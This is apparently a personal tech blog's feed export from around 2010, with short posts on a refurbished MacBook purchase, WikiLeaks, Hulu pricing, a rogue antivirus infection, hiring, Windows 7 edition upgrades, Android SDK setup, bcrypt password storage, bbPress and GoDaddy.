<p>When you buy something from CowBoom, you are presented with a list of individual units which includes a list of what&#8217;s included or missing, its condition, and any inspection notes. You can go through this list to pick the one that looks best, and that&#8217;s the one that will be shipped to you. It&#8217;s a fairly nice system, though prices should be carefully checked; I&#8217;ve seen items that were several years old going for more than the current version as well as items going for more than retail (though this seems to be a fairly rare case).</p>

<p>After looking at their prices and the unit description ($689 for the current MacBook [$750 after taxes]), and seeing the 30-day <a href="http://www.cowboom.com/rma/">return policy</a> – I decided that was the best route to go. So on the 19th I placed the order. Overall, I felt like I was getting a good deal and was rather happy.</p>

<p>This is where the warm-fuzzy starts to fade.</p>

<p>Despite ordering on the 19th, the package wasn&#8217;t actually shipped until the 27th. It finally arrived on the 3rd, 14 days after being ordered; it came from California though I often have better turn-around times with packages coming from China. Needless to say, the shipping was a bit disappointing.</p>

<p>Knowing that it was likely a retail return certainly left me a bit wary, but being tested (or so they say) and covered by a no-questions-asked return policy made me more confident that in the end I would have a decent unit. It was packed quite securely, and I was quite relieved to discover that the laptop was in the original package; I pulled it out of the box and was surprised that it was in perfect condition, and that the power cord was still sealed with the original packaging. Jackpot. It would have cost me more than $1,100 after taxes to buy that same laptop from Apple.</p>

<p>The feeling of victory quickly faded though; I pressed the power button and nothing happened. No lights, no sound, nothing. After plugging it in, it booted up immediately; most laptops I&#8217;ve purchased were shipped at least partially changed so this seemed a bit odd to me. Being suspicious, I checked the battery information – it wasn&#8217;t charging and was only showing 1 charge cycle. Now I know why it was returned.</p>

<p>It was an uncomfortable couple hours as I researched and tested different solutions; though after resetting the <a href="http://support.apple.com/kb/ht3964">SMC</a> multiple times and numerous reboots – it started working. I&#8217;ve been using it pretty heavily over the last couple days while configuring it for development, since getting through that fist issue there&#8217;s been no problems at all.</p>

<p>Overall, I&#8217;ve got a new MacBook that&#8217;s in great condition with no issues for well under retail. Was the time and trouble worth it? I&#8217;m not sure.</p>

<p><em>[Note: I apologize for the excessive length of this post; I originally intended to only write a few brief paragraphs, not a 1,100+ word essay. Perhaps now that I&#8217;m primarily writing code in C#, that tendency to verbosity that I learned from my Visual Basic days is expressing itself in my writing. After writing this I showed it to my wife and asked if it was too long; she quickly glanced to the bottom and asked where the &#8220;I Agree&#8221; button was. Point made quite clearly. I will endeavor for brevity in the future for posts such as this. If you have made it this far, please give yourself a cookie for me, you deserve it.]</em></p>

      <title>WikiLeaks Biggest Problem: Julian Assange</title>
      <description><p>WikiLeaks has a growing issue that could easily lead to its downfall, and that problem is its leader, <a href="http://en.wikipedia.org/wiki/Julian_Assange">Julian Assange</a>. As time goes on, he is becoming the persona of the organization, and as this happens he becomes more of a target, and more of a threat to the organization&#8217;s stability. There are rumors of death threats and assassination plots, on top on the fact that he is <a href="http://www.guardian.co.uk/media/2010/nov/30/interpol-wanted-notice-julian-assange">wanted</a> in Sweden for what he has claimed to be trumped-up charges. Those that seek to stop WikiLeaks are increasingly attacking Assange directly, and focusing less on those behind the scenes or the organization itself. One outspoken leader doesn&#8217;t make the organization.</p>

<p>Assange has become a threat to WikiLeaks not because of the attacks against him, but because people see him <em>as</em> WikiLeaks. If he was arrested today, how much faith would there be in WikiLeaks? I am sure that they have developed contingency plans should something happen to Assange, but those plans will likely do little to promote faith and trust, or to calm the media firestorm that would surely erupt.</p>

<p>For WikiLeaks to survive the trials that it will soon face, they need to ensure that there is a strong governance body in place controlling the organization. For their mission to continue, they must become more than just Julian Assange to the public. Trust is <em>the</em> key asset for WikiLeaks, and if that trust is lost, then few will accept the authenticity of their releases; they must take steps to preserve that trust.</p>

      <title>Being Fair</title>
      <description><p>A couple weeks ago, Hulu Plus shed its beta tag and opened to the general public. When this happened, the price was changed and a new one week free trial was added. As a subscriber I was happy to hear about the new lower price, though my main concern was wondering if I would have to contact them to get the price break. That concern, thankfully, was the furthest thing from the truth. Soon as the news hit, I found this email waiting for me:</p>

<blockquote><p>Hi Adam,</p>

<p>Thanks for being a subscriber to Hulu Plus during our preview. We&#8217;ve been hard at work refining our existing applications, expanding the device coverage, and extending our content lineup. We&#8217;re excited to announce that today, Hulu Plus is officially launching out of preview to anyone in the U.S. for just $7.99/month.</p>

<p><strong>Since we&#8217;re now offering Hulu Plus at a lower price than during the preview, your subscription fee has been lowered to $7.99/month, and on your next billing cycle, we&#8217;ll also automatically credit your account with $2 for each month you&#8217;ve been a subscriber. In addition, we&#8217;re now offering a 1-week free trial for all new subscribers, so we&#8217;ll be issuing you an additional $2 credit since the free trial wasn&#8217;t in place during the preview.</strong></p>

<p>We&#8217;d also like to offer you the chance to earn more free time on Hulu Plus by helping us spread the word about the service. For each friend who uses your referral to join Hulu Plus, we&#8217;ll give you two additional weeks for free, up to 20 weeks total. Each of your referrals will also receive two weeks free on their first month&#8217;s subscription. For more details on the program and to invite your friends, please visit <a href="http://www.hulu.com/profile/referrals?src=plus_launch">http://www.hulu.com/profile/referrals</a>.</p>

<p>Since the Hulu Plus preview began, we&#8217;ve added more TV shows and extended our device coverage. To see which shows are now available on Hulu Plus, please visit <a href="http://www.hulu.com/plus?src=plus_launch#content">http://www.hulu.com/plus/content</a>, and to see the most up-to-date list of supported TVs, Blu-ray players, set-top boxes, mobile phones, and tablets visit <a href="http://www.hulu.com/plus?src=plus_launch#devices">http://www.hulu.com/plus/devices</a>.</p>

<p>Thanks for supporting us during the Hulu Plus preview. We look forward to continuing to work on your behalf in the months and years to come.</p>

<p>The Hulu Team</p></blockquote>

<p>(emphasis added)</p>

<p>This is about the last thing I expected, especially from a company <a href="http://en.wikipedia.org/wiki/Hulu#History">backed</a> by major media players. I would hate to imaging how much this move cost them, but I know it bought them plenty of loyalty; it&#8217;s rare to to see companies go out of their way to be fair to customers, and even moreso when it means giving back money they&#8217;ve already collected. If you want to win the hearts of your customers, this is the kind of move that does it.</p>

<p>If you change the price on a service or application – how will you current customers feel? Will they feel cheated for being an early adopter? It&#8217;s your current customers that will bring in new customers; make sure you take good care of them, and they will take care of you.</p>

      <title>Thinking before you speak</title>
      <description><p>The recent release of <a href="http://cablegate.wikileaks.org/">diplomatic cables</a> by WikiLeaks has caused many to stop and think - which is always a good thing in my opinion. Of the many comments I&#8217;ve seen on this subject, one by Jeff Atwood seems to be the most relevant:</p>

<p><em>&#8220;WikiLeaks is preaching a message I&#8217;ve always practiced: there should be no difference between internal and external communication&#8221; (<a href="http://twitter.com/codinghorror/statuses/9505496079798272#">twitter</a>)</em></p>

<p>Be it for a personal vendetta, political reasons, or perhaps just the love of chaos; there is always somebody that would love to take your secrets &amp; thoughtless words and expose them to the world. Even with the best security systems that the US Government could build, one person that wanted it all exposed was able to leak hundreds of thousands of documents before <a href="http://www.telegraph.co.uk/news/worldnews/northamerica/usa/8166395/Bradley-Manning-The-prime-suspect-of-giving-files-to-WikiLeaks.html">exposing himself</a> and ending his crusade.</p>

<p>We should all be taking at least some precautions to protect our private communications, ensuring we use SSL wherever possible, avoiding unencrypted wireless networks, encrypting sensitive data and the like. By making a few smart decisions our secrets are a little safer, but there’s always the risk that there will be an insider ready and waiting. Anytime there is <em>interesting </em>communication, there will be people who want to see it exposed.</p>

<p>In my current position, I tend to see a lot of dirty laundry go through my inbox – nothing illegal, but some things that could certainly be embarrassing. At times I’m amazed that people would type some of the things that they do, both our clients and internally. If they had been a little more careful about what they said, nobody would ever care; but as it stands, if publicly released they could lead to a real black-eye on somebody’s reputation.</p>

<p>To minimize exposure to these risks, words should be carefully chosen and the impact of public disclosure always considered.</p>

<p>Obviously though, there are times that the subject is sensitive and that is simply unavoidable. All one can do is take all the reasonable precautions and carefully consider the impact of their words, should they be exposed to the rest of the world.</p>

      <title>Christopher Adam Caudill - 6lbs, 7oz - Born 8/2/2010</title>
      <description><p><img src="http://adamcaudill.com/files/2010/08/IMG_20100803_155355.jpg.scaled1000-300x224.jpg" alt="" />
On Monday, August 2nd 2010 at 11:16 PM, Christopher Adam Caudill was born.</p>

<p>Weighing in at 6 pounds and 7 ounces and 19.25 inches, born just 24 minutes after our arrival at the hospital. He was born almost a month early, and was initially diagnosed with pneumonia, in addition to having issues maintaining his body temperature (as is common with babies born early). Thankfully, the next day the pneumonia diagnosis was withdrawn and his body temperature stabilized.</p>

<p>On Wednesday afternoon, both mother and baby were discharged with a clean bill of health.</p>

<p>(Sorry for not posting this sooner, decided it would be best to drop off the radar until things calmed down.)</p>

      <title>State of the (virus) art&#8230;</title>
      <description><p>Imagine my surprise when one of my developers mentions he has a virus and I see this on his screen:</p>

<p><img src="http://adamcaudill.com/files/2010/07/IMG_20100726_163201.jpg.scaled1000-300x224.jpg" alt="" />
No, the items listed aren&#8217;t the issue, it&#8217;s <a href="http://en.wikipedia.org/wiki/Security_Tool">Security Tool</a> that&#8217;s the virus. It&#8217;s vicious, plain and simple. It prevents almost all software from running (either by presenting a &#8220;virus warning&#8221; or simply killing the process), presents fake BSODs, and who knows what else that we didn&#8217;t notice. Only Explorer and Internet Explorer were operational, all other software was disabled.</p>

<p>As soon as the issue was found, the workstation was removed from the network while we attempted a clean-up via <a href="http://www.malwarebytes.org/">Malwarebytes</a> and a couple other similar tools. After running a scan from each tool in safe-mode it looked like we had it beat. We were wrong. The next reboot, and it was back - I&#8217;m not surprised but somewhat disappointed that none of the tools actually performed the cleanup correctly. There are several routes it could have taken to ensure that it would re-infect on boot, seems at least one of those was missed.</p>

<p>The one saving grace is that for some reason, it doesn&#8217;t attack while in safe-mode. Had this not been the case, data recovery would have been far more time consuming than it was (about four hours). Once the data was secured and logs and various backups for later analysis were captured, the workstation was re-imaged. In total, probably 30 hours were lost among development, technicians, and networking - not to mention the time spent by the security team members. A rather costly exercise, all things considered.</p>

<p>There&#8217;s still one question floating around - how did this happen? The workstation in question was running a fully patched Windows XP install, Symantec Corporate anti-virus with the latest updates, behind a firewall and content filters, yet it still happened. How did our pricey anti-virus solution not detect this? Why didn&#8217;t it detect anything at all?</p>

<p>It amazes me that here in 2010 we still have to worry about computer viruses (or virii, if you prefer); but I find it utterly unacceptable that that a top-tier, fully managed and updated anti-virus product allows such a debilitating pile of code to execute. Computer science has made amazing strides and modern PC hardware has more than enough resources to perform more intense analysis and monitoring - yet it still happened.</p>

<p>Have we actually lost this battle?</p>

      <title>Am I doing too much?</title>
      <description><p>(Disclaimer: This is something of a rant, and was written at 3AM. My apologies if it doesn&#8217;t make sense. Feel free to ignore.)</p>

<p>It&#8217;s 3AM, and I&#8217;m up reading, again. Is it the latest great novel or one of the classics that I enjoy so much? No, it&#8217;s research for my latest hobby. It&#8217;s lasers this time, but this pattern is far from new.</p>

<p>I&#8217;m starting to think I just try to do too much, I go in too many different directions.</p>

<p>I&#8217;ve sunk literally thousands of dollars and countless hours in photography, invested more than I would dare guess in hardware and software in various software development projects. I&#8217;ve collected everything from coins to <a href="http://adamcaudill.com/bayonet-collection/">bayonets</a> (<a href="http://www.flickr.com/photos/adamcaudill/sets/72157594276549640/">swords too</a>). Now, all I&#8217;m thinking about is lasers; and I&#8217;m not talking about pointers, but the kind of lasers that light a match in an instant or burn a hole through cardboard and plastic.</p>

<p>Lasers at this power aren&#8217;t cheap, quite complex, and extremely dangerous (not to mention it&#8217;s a felony to import 99% of the ones on the market into the US). Sounds perfect for me, right?</p>

<p>In my typical fashion, to justify the expenses and time investment, I start looking for a return - I start working on a business plan. It&#8217;s starts with a basic idea, then a domain name or three, a quick(-ish) web page, and weeks of losing sleep to get everything ready. That start, is also normally the end. I get busy at work which leads to me thinking about other things and soon several weeks have gone by and I&#8217;m looking at a new, more exciting hobby or project. Some hobbies (mostly photography) come back, most others don&#8217;t.</p>

<p>Wash, rinse, repeat - ad nauseam.</p>

<p>It&#8217;s always educational - I always manage to get something new out of a hobby; but at what cost? Losing the money isn&#8217;t too big of a deal for me (though moreso in the last couple years than the past), but the wasted time is another story. Few people fully grasp how valuable and fleeting time is - especially with those you care about.</p>

<p>So here it is, time I should be resting up for all things I need to do to keep my life together, and I&#8217;m making a list of all the things I need to buy and think about for my laser projects:</p>

<ul>
<li><p>Buying a Laser Power Meter</p></li>
<li><p>Buying a bunch of DVD/Blu-ray sleds to harvest the <a href="http://en.wikipedia.org/wiki/Laser_diode">laser diodes</a></p></li>
<li><p>Designing a custom power regulator (driver) using <a href="http://www.arduino.cc/">Arduino</a>, because a simple non-<a href="http://en.wikipedia.org/wiki/Integrated_circuit">IC</a>, non-programmable setup is just too boring</p></li>
<li><p>Getting a rough model of my custom host designed in whatever <a href="http://en.wikipedia.org/wiki/Computer-aided_design">CAD</a> software I have handy</p></li>
<li><p>Figuring out which lens I need for each color (and how bad of an idea it would be to a 650nm lens for a 405nm diode)</p></li>
<li><p>Ordering lenses, modules, and generic hosts (until the custom ones are ready) from China</p></li>
<li><p>Looking for <a href="http://en.wikipedia.org/wiki/Printed_circuit_board">PCB</a> manufactures that are willing to do small runs (and should I do <a href="http://en.wikipedia.org/wiki/Surface-mount_technology">SMT</a> or <a href="http://en.wikipedia.org/wiki/Through-hole_technology">THT</a>)</p></li>
<li><p>Reading through FDA and US Customs rules and polices (I really would hate to go to jail over a laser&#8230;)</p></li>
<li><p>Do I need to get an attorney involved (as I really would hate to be sued&#8230;)</p></li>
<li><p>Or maybe I could just contract all this out to China and have them build what I want and legally import them (which leads to a rather scary list, trust me)</p></li>
</ul>


<p>Over the last few weeks I&#8217;ve learned more about safety regulations, customs operations, electronics, and manufacturing than I thought I would ever know.</p>

<p>The cost this time? I&#8217;ve got a huge project at work that is way behind schedule, which is bad. But there&#8217;s bigger things going on: within the next month my wife will be giving birth, and I&#8217;m just now realizing how unprepared I am for it.</p>

<p>It&#8217;s 3AM, and I&#8217;m lost in a world of lasers.</p>

      <title>on Hiring</title>
      <description><p>The company I work for is hiring several developers which marks my first significant hiring effort since being promoted to management. This had led to a few interesting observations* I would like to share that may benefit both those looking for a new job and those looking for the next star to add to their team.</p>

<p><strong>Immigration Law:</strong> I had no idea how complex this area of law gets; it&#8217;s a maddening maze of rules and policies that are more effective at confusing those involved than providing a reasonable solution to a problem. If you run into this (and you will), you need somebody that has dealt with this and knows what to do. Getting both parties into legal hot water is far too easy.</p>

<p><strong>Resumes:</strong> I&#8217;ve seen great resumes that made it clear that I needed to hire this person and resumes so cluttered and complex it took an hour just to get through it. Here&#8217;s a few things that stuck out to me:</p>

<ul>
<li><p><a href="http://en.wikipedia.org/wiki/Don't_repeat_yourself">DRY</a> is good for code, and for a resume. Clean and concise is always better; if you find yourself hitting Ctrl+C even once while working on a resume, you&#8217;re probably doing something wrong.</p></li>
<li><p>Length is important, but shorter isn&#8217;t always better. Unlike many other fields where a single page resume is considered optimal, technical resumes need at least a second page. Going too short on a resume is a great way to blend into the crowd; a resume should stand out, and that takes space.</p></li>
<li><p>How long is too long? Unless you&#8217;ve been doing this for a <em>very</em> long time, more than three pages is probably excessive. This isn&#8217;t always true, but think it through before using more than two pages.</p></li>
<li><p>Use whitespace carefully. Don&#8217;t leave a page half empty or pack everything in so that it looks cluttered. As with any type of design, whitespace is a powerful tool that should be used wisely and never be left to chance.</p></li>
<li><p>Use color sparingly. Many corporate printers are black and white only, so if you use color make sure it looks right when printed without it.</p></li>
<li><p>Use bold even more sparingly. It&#8217;s sometimes useful to point out items of interest, but it quickly degrades the readability of a resume.</p></li>
</ul>


<p>Many people seem to have a hard time with this, but a resume is a <em>textual representation of yourself</em>. It represents you as a person and your accomplishments as a professional. Any errors or signs of haste or carelessness say much about you as a person; if you are careless with such a significant representation of yourself what does it say about your attention to detail or work ethic?</p>

<p><strong>Experience:</strong> For a person that has recently graduated, experience in the field is the single largest hindrance both when it comes to securing a position and to receiving a salary they are happy with. The best advice I can find for people in this position is to look to the open source community for help. There are many projects that are desperate for developers and it&#8217;s a great way to get familiar with working in a team, coordinating with people over a distributed area, and releasing code for public consumption. In lieu of paid work experience, open source is a great way to fill in a resume (and it can be quite profitable for some, if you play your cards right).</p>

<p><strong>Salary:</strong> In some companies pay is a minor issue thanks to clearly structured systems such as that <a href="http://www.joelonsoftware.com/articles/fog0000000038.html">proposed</a> by Joel Spolsky; for others is can be a source of pain, envy, and jealousy. This is a topic that I truly hate; it&#8217;s uncomfortable at best and quite painful at worst. While I can&#8217;t offer much advice, here are a few things to think about:</p>

<ul>
<li><p>Money is not an effective motivator. In an ideal environment it should just stay out-of-the-way and allow developers to live a comfortable life; in reality the role it plays is a bit different. More often than not, it&#8217;s a distraction that gets in the way and outweighs the factors that do motivate people.</p></li>
<li><p>Companies follow a few different pay systems, and once set moving to different system is nearly impossible. Here are a few I&#8217;ve seen:</p>

<ul>
<li><p>Clearly Structured: This system places developers on a scale, and developers at a given level receive the same salary (see <a href="http://fogcreek.com/">Fog Creek</a>).</p></li>
<li><p>Structured + Negotiated: This is the most common system I&#8217;ve seen; it mixes a structured level system with negotiated modifications that can apply a certain percentage increase from the normal base salary for that level or other benefits (extended vacation, etc).</p></li>
<li><p>Negotiated: Pay is based on negotiation skills and need; this can lead to odd situations such as where a junior developer can make more than a senior developer due to the need to fill a position quickly. This system requires strict secrecy when it comes to salary information to avoid nasty surprises, unlike the clearly structured system where salary information can be openly shared.</p></li>
</ul>
</li>
<li><p>Are large salary increases possible? Some companies have no issue with large increases in salary for a promotion (20%+) while in others exceeding 5% for any reason is a major challenge. If a developer is coming in on the low-end of the scale (i.e. due to lack of experience, such as a recent graduate), is there a real possibility of moving up? In my experience, people stay near the end they start at - those that start at the bottom will stay there until they move to a different company.</p></li>
</ul>


<p><strong>Interview Questions:</strong> If you are conducing an interview, make a list of questions and write them down. It&#8217;s quite embarrassing to suddenly realize that you are out of questions just a few minutes in (Need inspiration? Try <a href="http://en.wikipedia.org/wiki/Microsoft_interview">this</a> or <a href="http://www.joelonsoftware.com/articles/GuerrillaInterviewing3.html">this</a>). Many people have said much about this, but the most important thing I can point out is just don&#8217;t wing it. Plan carefully, make sure you know what you&#8217;re going to do and when before the candidate shows up.</p>

<p><strong>Interview Dress Code:</strong> I&#8217;ve been amazed at what I&#8217;ve seen people wear, everything from high-end suits to jeans. What&#8217;s appropriate? It really depends on the environment; a large corporation will expect an Armani suit where a startup is happier seeing jeans and an American Apparel t-shirt. When in doubt, I would go with a suit personally - but depending on the company that could cost you the job just as quickly as showing up in jeans.</p>

<p><strong>Interviews Go Both Ways:</strong> An interview shouldn&#8217;t be a one-way affair; the candidate should be interviewing the company as much as you are interviewing them. They should be asking questions about the environment, expectations, tools and resources provided as much as you are asking them about prior experience and knowledge. If a candidate doesn&#8217;t seem to care about the company or what the working conditions are like - think carefully before hiring them.</p>

<p><strong>Other Thoughts:</strong> I&#8217;ll not go into what I look for when it comes to personality or other personal traits as that would require far more than a blog post to cover. I&#8217;m also going to avoid things such as hobbies and the like; while they can tell you much about a person they can also lead to other complications. Any question in an interview can quickly lead to a land-mine and in the legal quagmire that is HR law and policies, trouble is easy to find. When in doubt, just don&#8217;t ask.</p>

<ul>
<li>This is based on my experience over the years; not necessarily the experiences in this round of hiring or the opinions or policies of my employer. In general, nothing in this refers to policies, preferences, or procedures of my employer. <Standard Disclaimer /></li>

      <title>Upgrading Windows 7 Pro VL</title>
      <description><p>While performing some testing on a Windows 7 Professional workstation running a VL build from MSDN I found that a feature I needed was missing - the new <a href="http://blogs.msdn.com/b/rds/archive/2009/07/01/using-multiple-monitors-in-remote-desktop-session.aspx">Multi-Monitor RDP</a> support. After a little <a href="http://windows.microsoft.com/en-us/windows7/Remote-Desktop-Connection-frequently-asked-questions#">research</a> I found that only the Ultimate and Enterprise editions support this feature; which thanks to Windows 7&#8217;s <a href="http://en.wikipedia.org/wiki/Windows_Anytime_Upgrade">Anytime Upgrade</a> feature I assumed this would be no issue.</p>

<p>But, it was an issue.</p>

<p>It turns out that the build of Windows 7 I was using was missing <code>WindowsAnytimeUpgradeUI.exe</code> and the other related files needed to make the Anytime Upgrade work - and copying the files from another box doesn&#8217;t work. It seems this build simply can&#8217;t be upgraded in this fashion. So I tried a few other tricks, hoping to find something that would work:</p>

<ul>
<li><p>Reactivate Windows with an Ultimate key; fails with an error indicating that a Professional key is required.</p></li>
<li><p>Run Ultimate edition installer from Windows; fails with <a href="http://adamcaudill.com/files/2010-06-18_0332.png">this error</a> indicating that you can&#8217;t perform edition upgrades.</p></li>
</ul>


<p>So being stubborn and determined not to re-install Windows to make this feature work, I started looking for other options. Thanks to a hack for <a href="http://www.gmtaz.com/how-to-upgrade-windows-7-rc-ultimate-to-rtm-enterprise/comment-page-1/">upgrading the RC builds to Final</a>, I found what I needed.</p>

<p>I edited the <code>EditionID</code> and <code>ProductName</code> to reflect Ultimate instead of Professional, rebooted, and then ran the Ultimate installer from within Windows. This time the installer ran without issue and after an hour and a couple reboots it was done. This in-place upgrade/repair procedure allows you to jump to a different edition with fairly little pain. A couple of Windows settings needed to be corrected (primarily display related) and Visual Studio 2010 had to be re-installed, though otherwise everything worked just as it did before.</p>

<p>This is the only method for upgrading these Windows 7 builds that I&#8217;ve found, the only other option is to re-install Windows from scratch.</p>

      <title>Android &amp; Windows 7 64bit</title>
      <description><p>Setting up the Android SDK on Windows 7 64bit, with a 64bit JDK / JRE is a bit less straightforward than one would expect, thankfully though the solution is quite simple. There are two settings that need to be adjusted to make this work - otherwise you&#8217;ll get an error indicating that Java can&#8217;t be found.</p>

<p>Step 1: Modify your <code>PATH</code> to include the <code>bin</code> folder of the JRE. Mine looks like this:</p>

<p><code>C:\Program Files\Java\jre6\bin</code></p>

<p>Step 2: Set the <code>ANDROID_SWT</code> variable (you&#8217;ll probably need to add it) to the <code>\tools\lib\x86_64</code> folder of the Android SDK. Mine looks like this:</p>

<p><code>C:\Android\SDK\tools\lib\x86_64</code></p>

<p>With these two changes, everything seems to work as expected. Why this is required on 64bit but not 32bit I&#8217;m not sure, but this does seem to solve the problem.</p>

      <title>Secure Password Storage</title>
      <description><p>Do you use MD5 or SHA1 to store passwords? Think they are secure? Think again.</p>

<p>While generic hashing algorithms are certainly better than storing passwords in <a href="http://www.techcrunch.com/2009/12/14/rockyou-hacked/">plain text</a>, it&#8217;s still not as secure as it should be. Users place great trust in us to ensure that their credentials will be secure and treated with the utmost respect; it&#8217;s our responsibility to live up to these expectations.</p>

<p>With the simplicity and speed of these general purpose algorithms, it&#8217;s possible to generate hashes looking for <a href="http://en.wikipedia.org/wiki/Collision_(computer_science">collisions</a>) (or even the original value) extremely quickly. It&#8217;s this speed that introduces the fatal flaw; with a database dump containing MD5 hashed passwords, with a fairly small investment most could be recovered within a very small amount of time (mere days for a large database).</p>

<p>Many people are moving to bcrypt as a solution. In Coda Hale&#8217;s &#8221;<a href="http://codahale.com/how-to-safely-store-a-password/">How To Safely Store A Password</a>&#8221; he covers this topic in more detail, complete with useful stats and links to implementations in languages from <a href="http://derekslager.com/blog/posts/2007/10/bcrypt-dotnet-strong-password-hashing-for-dotnet-and-mono.ashx">C#</a> to <a href="http://github.com/codahale/bcrypt-ruby">Ruby</a> (even <a href="http://github.com/skarab/erlang-bcrypt">Erlang</a> is represented).</p>

<p>If you are looking for ways to better protect your user&#8217;s data, take a closer look at your password storage.</p>

      <title>What&#39;s your Code Legacy?</title>
      <description><p>When you move on to your next challenge how will those that inherit your code think of you? Noble or notorious, innovator or insane? This is a question that all developers should ask themselves frequently; though too few ever do. You should always write with the assumption that someday a new developer will take over your code, and they will question every decision and assumption you&#8217;ve made. When this happens, what will they think of you?</p>

<p>Perhaps I&#8217;m more aware of this because I maintain an internally developed shared library that my company uses in every application; but regardless of the scope of the project you should always assume that someday you will hand the project off. Many developers think little about what happens to their code after it passes on to another; what other developers will have to deal with, or how their efforts will be perceived.</p>

<p>When I&#8217;m training a new developer there are a few points I try to reinforce as much as possible:</p>

<ol>
<li><p>Code is only good if other developers can work on it without extensive training. If it takes days or weeks of introduction to get a new developer up to speed, then you&#8217;ve done something wrong1.</p></li>
<li><p>Clever solutions are no better than an ugly hack if it&#8217;s not clear what you are doing. If the code isn&#8217;t clear then it&#8217;s not maintainable, if it&#8217;s not maintainable then it&#8217;s junk.</p></li>
<li><p>Assume you&#8217;ll be hit by a bus. Always write code with the assumption that you won&#8217;t have the opportunity to cleanly pass the code off to a new maintainer. Never assume that you&#8217;ll have time to come back and clean things up later.</p></li>
<li><p>Always perform design reviews, no matter the size of the project2. Once you have a design in mind, talk it through with a at least two other developers. Just because you think it&#8217;s clean and clear doesn&#8217;t mean that others will see it that way as well.</p></li>
<li><p>Be consistent, always. I&#8217;ve seen more projects ruined by people doing things &#8220;their way&#8221; than anything else. Match style and design when working on an existing project. Be careful when adding new techniques, technologies, or methodologies to an existing project; unless you are willing to update the entire code-base, you can easily create a minefield without realizing it.</p></li>
</ol>


<p>If you want your work to be seen positively after you move on, start thinking about your heirs today. The opinion they have of you will be almost entirely based on what they see in your code - not the stories or memories left behind.</p>

<p>1 - There are always exceptions; these are generalized guidelines, not hard and fast rules.
2 - This includes &#8220;throw away&#8221; projects, many projects that are intended to have a short life end up living far longer than intended. This is the most likely place that your heirs will find code that makes them question the quality of your work.</p>

      <title>bbPress: Is the end near?</title>
      <description><p>I&#8217;ve been a fan of bbPress for quite some time; I&#8217;ve even contributed code to the project. For those that aren&#8217;t familiar with it, bbPress is an open-source forum system written in PHP. It&#8217;s fast, lightweight, easy to install and even easier to use. It also scales, quite well.</p>

<p>bbPress was originally written to power the support forums WordPress.org, which get quite a bit of traffic. Later, it was released as a separate project. While it doesn&#8217;t have nearly the feature set found in more popular systems such as vBulletin or phpBB; it makes up for it in simplicity. It&#8217;s designed to be conversation-centered, where the clear focus is on what people are saying, not the bells and whistles provided by the software.</p>

<p>I&#8217;ve used it for a couple sites and couldn&#8217;t be more pleased; though now I fear the end may be near.</p>

<p><a href="http://automattic.com/">Automattic</a>, the company behind Wordpress.com (and <a href="http://bbpress.org/blog/2009/04/talkpress-and-bbpress/">ListPress.com</a>) has <a href="http://bbpress.org/forums/topic/future-of-bbpress">committed</a> to supporting the project; though primarily in context to its role in the WordPress world. bbPress as a separate product has so much potential, though it seems Automattic has little interest in this; instead the interest seems to be in making bbPress just another add-on for WordPress.</p>

<p>At one point there was a lot of excitement and interest surrounding bbPress, though for a project like this to succeed you need input from the community, you need an open and fast paced development process. Unfortunately for bbPress, it had no such process. There were people who had the skill, time, and interest to lead the project and make it a success; but they were pushed away and the project was allowed to stagnate.</p>

<p>Today, there is <a href="http://bbpress.org/blog/2009/12/1-1-feature-poll/">some activity</a> going on, and I&#8217;m glad to see that it won&#8217;t fade away completely; though I see little chance that it will live up to what it could have been. I have a lot of respect for <a href="http://ma.tt/">Matt</a> and Automattic; they&#8217;re very successful and build great products; but they could have done so much more.</p>

<p>bbPress will go on I&#8217;m sure; though I believe only as a shadow of what it could have been. Though maybe Matt will prove me wrong, I certainly hope so.</p>

      <title>Leaving GoDaddy</title>
      <description><p>In December 2002 I made my first purchase from GoDaddy, since then I&#8217;ve spent $1,200 with them. Over the years I&#8217;ve seen them grow up to be a major force both in the registration and web hosting markets; I&#8217;ve also seen them go from lean and efficient to annoying and unfriendly.</p>

<p>Once upon a time GoDaddy had the best prices and the best search of any registrar; unfortunately things often change, and not always for the best. As time went on they added more products and adopted a very &#8220;in your face&#8221; style of marketing. For years I&#8217;ve dismissed the aggressive marketing as the cost of the low prices, but times have changed.</p>

<p>The aggressive marketing style, incredibly difficult to cancel subscriptions, feature <a href="http://adamcaudill.com/2009/10/03/cancel-godaddys-domain-privacy/">lock in</a>, and many other annoyances and issues. And why do I put up with this? It&#8217;s not the low prices, as for many things my current <a href="http://dreamhost.com/">hosting company</a> is far cheaper. I&#8217;m no longer locked, it&#8217;s not that. Loyalty? That it, well, that was it.</p>

<p>After 7 years, and $1,200 - I&#8217;ve started moving my domains over to my hosting company; and so far I couldn&#8217;t be happier. No aggressive marketing, good service, and they don&#8217;t nickel and dime me to death.</p>

<p>Loyalty can be a good thing, but how much is loyalty costing you? Is it worth it?</p>

      <title>Cancel GoDaddy&#39;s Domain Privacy</title>
      <description><p>While trying to renew a few domain names recently, I found that cancelling the Privacy service that GoDaddy offers (via <a href="https://www.domainsbyproxy.com/">Domains By Proxy</a>) is much more difficult than I had expected. The $8.99/year service conceals your name, address, and phone number from the public WHOIS listing.</p>

<p>Being concerned about privacy as most people are (or at least should be) it seemed a reasonable option but when multiplied by quite a few domains, it gets rather expensive. So during this last round of renewals I decided to cancel the service; figuring it would be no harder than removing the item from the shopping cart. To my surprise, it wasn&#8217;t nearly so easy.</p>

<p>Turns out that you have to sign into the DomainsByProxy web site with a Customer ID and password to cancel the service; so I tried the obvious and used my GoDaddy ID and password, though no such luck. I searched my email archives and didn&#8217;t find a single email from DomainsByProxy, at this point I was pretty sure whatever email address they had on file wasn&#8217;t valid, which is bad news for me. While there is an option to <a href="https://www.domainsbyproxy.com/RetrieveAccount.aspx?prog_id=&amp;myaurl=/login.aspx">recover your customer ID</a>, if their records aren&#8217;t accurate then it&#8217;s of no real use.</p>

<p>But there is hope.</p>

<p>It took a fair bit of reading and testing, but I finally found a method to get to your account IDs, and it&#8217;s fairly simple:</p>

<ol>
<li><p>Go to the <a href="http://www.godaddy.com/gdshop/dbp/landing.asp">Private Registration Page</a> on GoDaddy&#8217;s site (make sure you&#8217;re logged in to your GoDaddy account)</p></li>
<li><p>Type in some random characters into the search box</p></li>
<li><p>On the results page, click &#8220;Continue to Registration&#8221;</p></li>
<li><p>Click &#8220;No Thanks&#8221; on the ad page</p></li>
<li><p>Scroll down to the section labeled &#8221;<em>3. Select Your Domains By Proxy® Account</em>&#8221;</p></li>
</ol>


<p>You should now see your customer IDs for the DomainsByProxy web site. The web site only shows the first four account IDs, if you have more than that you can contact DomainsByProxy and have them merge the account IDs you know. Just continue the process until you have all of your accounts merged into one.</p>

